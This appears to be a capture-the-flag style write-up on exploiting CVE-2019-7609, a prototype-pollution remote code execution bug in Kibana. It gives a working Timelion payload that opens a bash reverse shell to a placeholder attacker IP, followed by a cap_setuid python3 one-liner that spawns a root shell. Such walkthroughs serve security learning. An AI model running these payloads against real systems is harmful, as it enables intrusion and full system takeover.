## Vulnerability Analysis

![](Image_3.png){: width="800" height="400" .shadow }

### CVE-2019-7609 — Kibana RCE via Prototype Pollution

This vulnerability affects Kibana versions **< 6.6.1**.

### Vulnerability Type

- **Type:** Prototype Pollution → Remote Code Execution (RCE)
    
- **Impact:** Full system compromise via Node.js execution
    

### Technical Explanation

- Kibana uses **Node.js** on the backend.
    
- The vulnerability allows pollution of JavaScript object prototypes using `__proto__`.
    
- By injecting malicious properties into the prototype chain, we can:
    
    - Override environment variables
        
    - Force Node.js to load arbitrary modules
        
- Specifically:
    
    - `NODE_OPTIONS` is abused to load `/proc/self/environ`
        
    - Injected environment variables execute OS commands
        

---

## Exploitation

### Payload

![](Image_4.png){: width="800" height="400" .shadow }

```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/YOUR_IP/9001 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### How It Works

1. Injects malicious environment variable (`AAAA`)
    
2. Forces Node.js to load `/proc/self/environ`
    
3. Executes reverse shell via `child_process.exec`

![](Image_10.png){: width="800" height="400" .shadow }

---

### Explanation — Linux Capabilities Abuse

- `cap_setuid` allows a binary to change its UID
    
- This capability is equivalent to **partial root privileges**
    
- If misconfigured, it enables privilege escalation
    

---

### Exploit

```shell
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
{: .nolineno }

This sets UID to root and spawns a root shell
